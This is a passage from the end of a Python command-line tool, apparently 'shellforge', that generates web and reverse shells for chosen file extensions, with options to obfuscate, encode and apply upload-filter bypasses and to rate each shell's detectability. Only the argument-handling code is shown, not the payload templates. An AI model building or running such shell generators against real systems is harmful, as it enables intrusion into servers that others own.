            print(f"  {i+1}. {variation[:100]}...")
        if len(wordlist) > 10:
            print(f"  ... and {len(wordlist) - 10} more")
        return
    
    if args.payloads:
        if not args.extension and not args.extension_pos:
            print("Error: --extension required with --payloads")
            return
        ext = args.extension or args.extension_pos
        payloads = forge.generate_payloads(ext, args.template)
        print(f"Generated {len(payloads)} payloads:")
        for i, payload in enumerate(payloads):
            print(f"  {i+1}. {payload[:100]}...")
        return
    
    if args.batch:
        try:
            with open(args.batch, 'r') as f:
                configs = json.load(f)
            results = forge.generate_batch(configs)
            print(f"Generated {len(results)} shells from batch config:")
            for i, result in enumerate(results):
                print(f"  {i+1}. {result[:100]}...")
        except Exception as e:
            print(f"Error processing batch file: {e}")
        return
    
    # Generate single shell
    if not args.extension and not args.extension_pos:
        print("Error: Extension required. Usage: ./shellforge.py IP PORT EXTENSION or --extension EXTENSION")
        print("Example: ./shellforge.py 192.168.1.100 4444 php")
        print("         ./shellforge.py --extension php --template basic --command whoami")
        print("\nUse --list-extensions to see all supported extensions")
        sys.exit(1)
    
    ext = args.extension or args.extension_pos
    cmd = args.command if args.command else 'whoami'
    
    try:
        shell = forge.generate_shell(
            extension=ext,
            template_type=args.template,
            command=cmd,
            obfuscate=args.obfuscate,
            encode=args.encode,
            bypass=args.bypass
        )
        
        if args.output:
            filename = forge.save_shell(shell, args.output, ext, bypass=args.bypass)
            print(f"Shell saved to: {filename}")
            if args.bypass:
                print(f"Bypass method applied: {args.bypass}")
        else:
            # Handle tuple return if bypass was used
            shell_content = shell[0] if isinstance(shell, tuple) else shell
            
            print("Generated Shell:")
            print("=" * 50)
            # Only print if it's text
            if isinstance(shell_content, str):
                print(shell_content)
            elif isinstance(shell_content, bytes):
                print(f"[Binary content - {len(shell_content)} bytes]")
            print("=" * 50)
            
            # Show analysis only for text shells
            if isinstance(shell_content, str):
                analysis = forge.analyze_shell(shell_content)
                print(f"\nShell Analysis:")
                print(f"  Length: {analysis['length']} characters")
                print(f"  Risk Level: {analysis['risk_level']}")
                print(f"  Detectability: {analysis['detectability']}")
                print(f"  Functions: {', '.join(analysis['functions']) if analysis['functions'] else 'None'}")
            
            if args.bypass:
                print(f"\nBypass method: {args.bypass}")
            
    except Exception as e:
        print(f"Error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)


if __name__ == '__main__':
    main()
